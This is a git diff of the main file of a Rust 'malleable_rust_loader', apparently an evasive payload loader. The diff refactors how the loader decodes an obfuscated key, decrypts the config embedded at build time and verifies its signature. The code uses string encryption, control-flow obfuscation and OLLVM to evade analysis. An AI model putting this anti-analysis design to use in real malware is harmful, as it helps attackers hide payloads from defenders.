@@ -12,7 +12,6 @@ use malleable_rust_loader::dataoperation::DataOperation;
 use malleable_rust_loader::payload::Payload;
 use malleable_rust_loader::payload_util::print_running_thread;
 
-use log::debug;
 use log::error;
 use log::info;
 extern crate env_logger;
@@ -24,10 +23,10 @@ use cryptify;
 const INITIAL_CONFIG_ENCRYPTED : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aead"));
 #[rustfmt::skip]
 #[cfg(not(feature="ollvm"))]
-const OFUSCATED_DECRYPT_KEY: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aead.dataop.obfuscated"));
+const OBFUSCATED_CONFIG_DECRYPT_KEY: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aead.dataop.obfuscated"));
 #[rustfmt::skip]
 #[cfg(not(feature="ollvm"))]
-const DECRYPT_KEY_OBFUSCATION: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aead.dataop.obfuscated.dataop"));
+const DECRYPT_KEY_OBFUSCATION_STEPS: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aead.dataop.obfuscated.dataop"));
 
 // ------ OLLVM compilation from docker
 #[rustfmt::skip]
@@ -35,32 +34,32 @@ const DECRYPT_KEY_OBFUSCATION: &[u8] = include_bytes!(concat!(env!("HOME"), "/.m
 const INITIAL_CONFIG_ENCRYPTED : &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aead");
 #[rustfmt::skip]
 #[cfg(feature="ollvm")]
-const OFUSCATED_DECRYPT_KEY: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aead.dataop.obfuscated");
+const OBFUSCATED_CONFIG_DECRYPT_KEY: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aead.dataop.obfuscated");
 #[rustfmt::skip]
 #[cfg(feature="ollvm")]
-const DECRYPT_KEY_OBFUSCATION: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aead.dataop.obfuscated.dataop");
+const DECRYPT_KEY_OBFUSCATION_STEPS: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aead.dataop.obfuscated.dataop");
 
 fn main() {
     #[cfg(feature = "logdebug")]
     env_logger::init();
     cryptify::flow_stmt!();
     let session_id: String = uuid::Uuid::new_v4().to_string();
-    info!("{}{}", lc!("[+] session_id: "),session_id);
+    info!("{}{}", lc!("[+] session_id "),session_id);
+    
+    let initial_config_encrypted = INITIAL_CONFIG_ENCRYPTED.to_vec();
+    let obfuscated_config_decrypt_key = OBFUSCATED_CONFIG_DECRYPT_KEY.to_vec();
+    let decrypt_key_obfuscation_steps_zlib = DECRYPT_KEY_OBFUSCATION_STEPS.to_vec();
+    let decrypt_key_obfuscation_steps = un_apply_all_dataoperations(vec![DataOperation::ZLIB], decrypt_key_obfuscation_steps_zlib).unwrap();
+    let ope_for_data_op: Vec<DataOperation> = serde_json::from_slice(decrypt_key_obfuscation_steps.as_slice()).unwrap();
+    let initial_config_decrypt_key = un_apply_all_dataoperations(ope_for_data_op, obfuscated_config_decrypt_key).unwrap();
+    let initial_config_decrypt_key_dataoperation: Vec<DataOperation> = serde_json::from_slice(initial_config_decrypt_key.as_slice()).unwrap();
 
-    let loader_conf_encrypted = INITIAL_CONFIG_ENCRYPTED.to_vec();
-    let data_op_encrypted = OFUSCATED_DECRYPT_KEY.to_vec();
-    //let ope_for_data_op: Vec<DataOperation> = vec![DataOperation::ROT13, DataOperation::BASE64];
-    let ope_for_data_op: Vec<DataOperation> = serde_json::from_slice(DECRYPT_KEY_OBFUSCATION.to_vec().as_slice()).unwrap();
-    let decrypted_dataop = un_apply_all_dataoperations(ope_for_data_op, data_op_encrypted).unwrap();
-    let dataoperation: Vec<DataOperation> =
-        serde_json::from_slice(decrypted_dataop.as_slice()).unwrap();
-    debug!("{}{:?}", lc!("[+] dataoperation: "), dataoperation);
     info!("{}", lc!("[+] DECRYPT initial config"));
-    let decrypted_conf = un_apply_all_dataoperations(dataoperation, loader_conf_encrypted).unwrap();
+    let initial_config_decrypted = un_apply_all_dataoperations(initial_config_decrypt_key_dataoperation, initial_config_encrypted).unwrap();
     info!("{}", lc!("[+] DECRYPTED!"));
-    let mut config: Config = serde_json::from_slice(decrypted_conf.as_slice()).unwrap();
+
+    let mut config: Config = serde_json::from_slice(initial_config_decrypted.as_slice()).unwrap();
     info!("{}", lc!("[+] VERIFY initial config"));
-    debug!("{:?}", &config);
     config.verify_newconfig_signature(&config).unwrap();
     info!("{}{}", lc!("[+] VERIFIED!"), "\n");
 
